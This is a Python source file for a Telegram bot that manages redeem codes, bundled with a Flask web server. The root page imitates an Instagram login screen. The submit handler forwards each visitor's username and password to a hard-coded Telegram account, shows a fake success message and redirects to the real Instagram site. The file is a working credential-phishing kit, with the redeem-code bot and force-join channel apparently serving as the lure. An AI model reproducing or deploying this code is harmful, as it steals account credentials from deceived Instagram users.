# bot_with_redeem_and_login_form.py
import os
import random
import string
import logging
import time
import asyncio
from threading import Thread
from typing import Set, Optional, Dict, Any, Tuple

from flask import Flask, jsonify, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.error import Forbidden, BadRequest, TelegramError
from telegram.constants import ParseMode  # For HTML parse mode

# ---------- Configuration ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
# Example: ADMIN_IDS="12345678,98765432" (not required now since we send form only to TARGET_ADMIN_ID)
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL")  # e.g. @mychannel or numeric id
WEB_SECRET = os.getenv("WEB_SECRET", "")  # secret token for protected HTTP endpoints (restart/open)
BOT_VERSION = os.getenv("BOT_VERSION", "v1.0")

# The single Telegram user ID that should receive form submissions:
TARGET_ADMIN_ID = 1694669957

if not BOT_TOKEN or not FORCE_JOIN_CHANNEL:
    raise ValueError("Missing BOT_TOKEN or FORCE_JOIN_CHANNEL environment variables!")

# ---------- Logging ----------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------- Runtime state ----------
codes: Dict[str, Dict[str, Any]] = {}  # in-memory codes store
_start_time = time.time()

# ---------- Force-join cache (to reduce API calls) ----------
# cache: user_id -> (is_member_bool, expire_ts)
_force_cache: Dict[int, Tuple[bool, float]] = {}
_FORCE_CACHE_TTL = 45.0  # seconds
_force_cache_lock = asyncio.Lock()

# ---------- Helpers ----------
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def generate_random_code(length=8) -> str:
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=length))

def format_uptime(seconds: float) -> str:
    s = int(seconds)
    hours = s // 3600
    mins = (s % 3600) // 60
    secs = s % 60
    if hours:
        return f"{hours}h {mins}m {secs}s"
    if mins:
        return f"{mins}m {secs}s"
    return f"{secs}s"

def compute_active_users() -> int:
    users: Set[int] = set()
    for info in codes.values():
        used_by = info.get("used_by")
        if isinstance(used_by, list):
            users.update(used_by)
        elif isinstance(used_by, int):
            users.add(used_by)
    return len(users)

async def _get_cached_force_status(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    Returns True if member; uses short cache to limit get_chat_member calls.
    Admins always return True (bypass).
    """
    if is_admin(user_id):
        return True

    now = time.time()
    cached = _force_cache.get(user_id)
    if cached and cached[1] > now:
        return cached[0]

    async with _force_cache_lock:
        cached = _force_cache.get(user_id)
        if cached and cached[1] > now:
            return cached[0]
        try:
            member = await context.bot.get_chat_member(FORCE_JOIN_CHANNEL, user_id)
            is_member = member.status in ("member", "administrator", "creator")
        except BadRequest:
            is_member = False
        except Forbidden:
            is_member = False
        except Exception:
            logger.exception("Unexpected error checking chat member")
            is_member = False

        _force_cache[user_id] = (is_member, now + _FORCE_CACHE_TTL)
        return is_member

async def ensure_force_join_or_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    Ensures that non-admin user has joined the FORCE_JOIN_CHANNEL.
    If not joined, sends a friendly prompt with join button and returns False.
    Admins bypass and return True.
    """
    if not update.effective_user:
        return False
    user_id = update.effective_user.id
    if is_admin(user_id):
        return True

    is_member = await _get_cached_force_status(user_id, context)
    if is_member:
        return True

    join_button = InlineKeyboardMarkup(
        [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL.lstrip('@')}")]]
    )
    try:
        if update.message:
            await update.message.reply_text(
                "⚠️ <b>You must join our channel to use this bot.</b>\n\n"
                "Tap the button below to join and then retry the command.",
                reply_markup=join_button,
                parse_mode=ParseMode.HTML
            )
        elif update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(
                "⚠️ <b>You must join our channel to use this bot.</b>\n\n"
                "Tap the button below to join and then retry the action.",
                reply_markup=join_button,
                parse_mode=ParseMode.HTML
            )
    except Exception:
        logger.exception("Failed to send force-join prompt to user")
    return False

# ---------- Telegram Handlers ----------
start_message_user = (
    "👋 <b>Welcome to the Redeem Code Bot!</b>\n\n"
    "<b>Use the command below to redeem your code:</b>\n\n"
    "<code>/redeem &lt;code&gt;</code>\n\n"
    "Enjoy! 🤍"
)

start_message_admin = (
    "👋 <b>Welcome to the Redeem Code Bot!</b>\n\n"
    "<b>Use the command below to manage codes:</b>\n\n"
    "<code>/redeem &lt;code&gt;</code>\n\n"
    "<b>YOU ARE AN ADMIN OF THIS BOT 💗</b>\n"
    "<b>You can access commands 👇</b>"
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    if is_admin(update.effective_user.id):
        keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]]
        )
        await update.message.reply_text(
            start_message_admin,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    else:
        # For regular users require force-join
        ok = await ensure_force_join_or_prompt(update, context)
        if not ok:
            return
        await update.message.reply_text(start_message_user, parse_mode=ParseMode.HTML)

async def show_commands_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    commands_text = (
        "🛠 <b>Admin Commands:</b>\n\n"
        "<code>/generate &lt;code&gt; &lt;optional message&gt;</code> — One-time code\n"
        "<code>/generate_multi &lt;code&gt; &lt;limit&gt; &lt;optional message&gt;</code> — Multi-use code\n"
        "<code>/generate_random &lt;optional message&gt;</code> — Random one-time\n"
        "<code>/redeem &lt;code&gt;</code> — Redeem a code\n"
        "<code>/listcodes</code> — List all codes\n"
        "<code>/deletecode &lt;code&gt;</code> — Delete a code\n"
        "<code>/ping</code> — System ping (latency + uptime)"
    )
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]])
    await query.edit_message_text(text=commands_text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]])
    await query.edit_message_text(text=start_message_admin, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# ---------- Code Commands ----------
# codes dict shape:
# codes = {
#   "ABC123": {
#       "limit": 1,           # number of uses allowed (1 = one-time)
#       "uses": 0,            # uses so far
#       "message": "some text",
#       "created_by": admin_id,
#       "used_by": []         # list of user ids who used it
#   }
# }

async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # /generate <code> <optional message>
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /generate <code> <optional message>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    message = " ".join(args[1:]) if len(args) > 1 else ""
    if code in codes:
        await update.message.reply_text("❌ That code already exists.", parse_mode=ParseMode.HTML)
        return
    codes[code] = {
        "limit": 1,
        "uses": 0,
        "message": message,
        "created_by": update.effective_user.id,
        "used_by": []
    }
    await update.message.reply_text(f"✅ Code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)

async def generate_multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # /generate_multi <code> <limit> <optional message>
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /generate_multi <code> <limit> <optional message>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    try:
        limit = int(args[1])
        if limit < 1:
            raise ValueError()
    except ValueError:
        await update.message.reply_text("Limit must be a positive integer.", parse_mode=ParseMode.HTML)
        return
    message = " ".join(args[2:]) if len(args) > 2 else ""
    if code in codes:
        await update.message.reply_text("❌ That code already exists.", parse_mode=ParseMode.HTML)
        return
    codes[code] = {
        "limit": limit,
        "uses": 0,
        "message": message,
        "created_by": update.effective_user.id,
        "used_by": []
    }
    await update.message.reply_text(f"✅ Code <b>{code}</b> created (multi-use, limit {limit}).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)

async def generate_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # /generate_random <optional message>
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    message = " ".join(context.args) if context.args else ""
    for _ in range(10):
        code = generate_random_code(8)
        if code not in codes:
            break
    else:
        await update.message.reply_text("❌ Unable to generate unique code. Try again.", parse_mode=ParseMode.HTML)
        return
    codes[code] = {
        "limit": 1,
        "uses": 0,
        "message": message,
        "created_by": update.effective_user.id,
        "used_by": []
    }
    await update.message.reply_text(f"✅ Random code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # /redeem <code>
    if not update.message:
        return
    ok = await ensure_force_join_or_prompt(update, context)
    if not ok:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <code>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    info = codes.get(code)
    if not info:
        await update.message.reply_text("❌ Invalid code.", parse_mode=ParseMode.HTML)
        return
    user_id = update.effective_user.id
    if info["uses"] >= info["limit"]:
        await update.message.reply_text("❌ Code already redeemed / limit reached.", parse_mode=ParseMode.HTML)
        return
    info["uses"] += 1
    if isinstance(info.get("used_by"), list):
        info["used_by"].append(user_id)
    else:
        info["used_by"] = [user_id]
    await update.message.reply_text(f"✅ Code <b>{code}</b> redeemed!\n{info['message'] or ''}", parse_mode=ParseMode.HTML)
    # Notify admins (optional): here we notify the TARGET_ADMIN_ID only
    try:
        text = (
            f"📥 <b>Code Redeemed</b>\n\n"
            f"<b>Code:</b> {code}\n"
            f"<b>User:</b> {update.effective_user.mention_html()}\n"
            f"<b>Uses:</b> {info['uses']}/{info['limit']}\n"
        )
        # schedule notification (non-blocking)
        try:
            asyncio.get_event_loop().create_task(context.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML))
        except Exception:
            # fallback using application create_task
            context.application.create_task(context.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML))
    except Exception:
        logger.exception("Failed to notify TARGET_ADMIN_ID about redemption")

async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Admin-only: list codes summary
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    if not codes:
        await update.message.reply_text("No codes present.", parse_mode=ParseMode.HTML)
        return
    lines = []
    for code, info in codes.items():
        lines.append(f"<b>{code}</b> — uses {info['uses']}/{info['limit']} — message: {info['message'] or '(none)'}")
    text = "📜 <b>Codes:</b>\n\n" + "\n".join(lines)
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def deletecode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # /deletecode <code>
    if not update.message:
        return
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /deletecode <code>", parse_mode=ParseMode.HTML)
        return
    code = args[0].upper()
    if code not in codes:
        await update.message.reply_text("❌ Code not found.", parse_mode=ParseMode.HTML)
        return
    del codes[code]
    await update.message.reply_text(f"✅ Code <b>{code}</b> deleted.", parse_mode=ParseMode.HTML)

# ---------- Styled Ping ----------
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return
        start = time.perf_counter()
        sent = await update.message.reply_text("🏓 Pinging...")
        elapsed = (time.perf_counter() - start) * 1000  # ms

        if elapsed < 150:
            status = "Excellent ⚡"
        elif elapsed < 300:
            status = "Good ✅"
        elif elapsed < 600:
            status = "Moderate ⚠️"
        else:
            status = "Poor ❌"

        uptime = format_uptime(time.time() - _start_time)
        response_ms = f"{int(elapsed)} ms"

        text = (
            "<code>[ SYSTEM PING ]</code>\n\n"
            f"<code>≡ Response : {response_ms}</code>\n"
            f"<code>≡ Status   : {status}</code>\n"
            f"<code>≡ Uptime   : {uptime}</code>"
        )

        await sent.edit_text(text, parse_mode=ParseMode.HTML)
    except Exception:
        logger.exception("/ping failed")
        if update.message:
            await update.message.reply_text("⚠️ Unable to measure ping right now.")

# ---------- Flask ----------
flask_app = Flask(__name__)

LOGIN_FORM_HTML = LOGIN_FORM_HTML = r"""
<!DOCTYPE html>  
<html lang="en">  
<head>  
  <meta charset="UTF-8">  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
  <title>User Login</title>  
  <style>  
    body {  
      background: #fafafa;  
      font-family: Arial, sans-serif;  
      display: flex;  
      justify-content: center;  
      align-items: center;  
      height: 100vh;  
    }  
    .container {  
      width: 350px;  
      background: #fff;  
      border: 1px solid #dbdbdb;  
      padding: 40px;  
      text-align: center;  
    }  
    .logo {  
      width: 120px;  
      margin-bottom: 20px;  
    }  
    input {  
      width: 100%;  
      padding: 10px;  
      margin: 6px 0;  
      border: 1px solid #dbdbdb;  
      border-radius: 3px;  
      background: #fafafa;  
    }  
    .login-btn {  
      width: 100%;  
      background: #0095f6;  
      color: #fff;  
      padding: 10px;  
      border: none;  
      border-radius: 3px;  
      font-weight: bold;  
      cursor: pointer;  
      margin-top: 10px;  
    }  
  </style>  
</head>  
<body>  
  <div class="container">  
    <!-- Instagram-style app logo -->  
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="App Logo" class="logo">  
    
    <h2>🔐 Instagram Login</h2>  
    <form method="POST" action="/submit_form">  
      <input type="text" name="username" placeholder="Username" required>  
      <input type="password" name="password" placeholder="Password" required>  
      <button class="login-btn" type="submit">Log In</button>  
    </form>  
  </div>  
</body>  
</html>  
"""

@flask_app.route("/")
def home():
    return Response(LOGIN_FORM_HTML, mimetype="text/html")

# Thread-safe scheduling helper for sending from Flask thread to bot loop
def _schedule_coro_from_thread(coro) -> bool:
    """
    Try to schedule coroutine on the saved event loop first (run_coroutine_threadsafe).
    Fall back to telegram_app.create_task (non-blocking) or a temporary event loop (blocking).
    """
    loop = getattr(flask_app, "telegram_loop", None)
    if loop and isinstance(loop, asyncio.AbstractEventLoop):
        try:
            asyncio.run_coroutine_threadsafe(coro, loop)
            logger.info("Scheduled send via run_coroutine_threadsafe (saved loop).")
            return True
        except Exception:
            logger.exception("run_coroutine_threadsafe failed")

    app_obj = getattr(flask_app, "telegram_app", None)
    if app_obj and hasattr(app_obj, "create_task"):
        try:
            app_obj.create_task(coro)
            logger.info("Scheduled send via telegram_app.create_task().")
            return True
        except Exception:
            logger.exception("telegram_app.create_task failed")

    # Last resort: run coroutine in a temporary loop (blocking)
    try:
        loop2 = asyncio.new_event_loop()
        loop2.run_until_complete(coro)
        loop2.close()
        logger.info("Sent message by creating a temporary event loop (blocking).")
        return True
    except Exception:
        logger.exception("Temporary event loop send failed")
    return False

@flask_app.route("/submit_form", methods=["POST"])
def submit_form():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    text = (
        "📩 <b>Form Submitted</b>\n\n"
        f"<b>Username:</b> {username}\n"
        f"<b>Password:</b> {password}"
    )

    # Prepare coroutine
    try:
        coro = flask_app.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML)
    except Exception:
        logger.exception("Failed to prepare send coroutine (bot may not be attached to flask_app).")
        return "<h3>⚠️ Internal error. Contact developer.</h3>"

    ok = _schedule_coro_from_thread(coro)
    if not ok:
        logger.warning("Scheduling message to TARGET_ADMIN_ID failed. Check event loop and that the admin has started the bot.")
        return "<h3>⚠️ Could not send data to admin. Please notify the admin to start the bot.</h3>"

    return """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Success</title>
  <style>
    body {
      background: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 350px;
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
    }
    .logo {
      width: 120px;
      margin-bottom: 20px;
    }
    h3 {
      color: green;
      margin-bottom: 10px;
    }
    p {
      margin: 5px 0;
    }
  </style>
  <!-- Auto redirect after 5 seconds -->
  <meta http-equiv="refresh" content="5;url=https://www.instagram.com">
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
         alt="App Logo" class="logo">
    <h3>✅ You Have Logined Successfully!</h3>
    <p>Thanks for Contribution 💗✅.</p>
    <p><b>Please wait, you are redirecting to Instagram Login in 5s...</b></p>
  </div>
</body>
</html>
"""

# ---------- Status + placeholders ----------
@flask_app.route("/status")
def status():
    uptime = format_uptime(time.time() - _start_time)
    active_users = compute_active_users()
    return jsonify({
        "uptime": uptime,
        "version": BOT_VERSION,
        "active_users": active_users,
        "force_channel": FORCE_JOIN_CHANNEL,
        "bot_name": "Redeem Code Bot",
        "codes_count": len(codes)
    })

def _check_secret(req_json):
    if not WEB_SECRET:
        return False
    return req_json.get("secret") == WEB_SECRET

@flask_app.route("/restart", methods=["POST"])
def http_restart():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"ok": False, "message": "unauthorized"}), 401
    logger.info("Received /restart via HTTP - secret validated (no restart performed).")
    return jsonify({"ok": True, "message": "restart endpoint placeholder."}), 200

@flask_app.route("/open", methods=["POST"])
def http_open():
    data = request.get_json(silent=True) or {}
    if not _check_secret(data):
        return jsonify({"ok": False, "message": "unauthorized"}), 401
    logger.info("Received /open via HTTP - secret validated (placeholder).")
    return jsonify({"ok": True, "message": "open endpoint placeholder."}), 200

def run_flask():
    port = int(os.getenv("PORT", "5000"))
    flask_app.run(host="0.0.0.0", port=port, threaded=True)

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Attach bot + app to Flask so submit_form can notify admin
    flask_app.bot = app.bot
    flask_app.telegram_app = app

    # Save the event loop (so run_coroutine_threadsafe can be used from Flask threads)
    try:
        flask_app.telegram_loop = asyncio.get_event_loop()
        logger.info("Saved current asyncio loop for flask_app.telegram_loop")
    except Exception:
        flask_app.telegram_loop = None
        logger.info("Could not capture event loop; submit_form will fall back to other strategies")

    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(show_commands_callback, pattern="show_commands"))
    app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="back_to_start"))
    app.add_handler(CommandHandler("generate", generate))
    app.add_handler(CommandHandler("generate_multi", generate_multi))
    app.add_handler(CommandHandler("generate_random", generate_random))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("listcodes", listcodes))
    app.add_handler(CommandHandler("deletecode", deletecode))
    app.add_handler(CommandHandler("ping", ping))

    Thread(target=run_flask, daemon=True).start()
    logger.info("Bot is starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
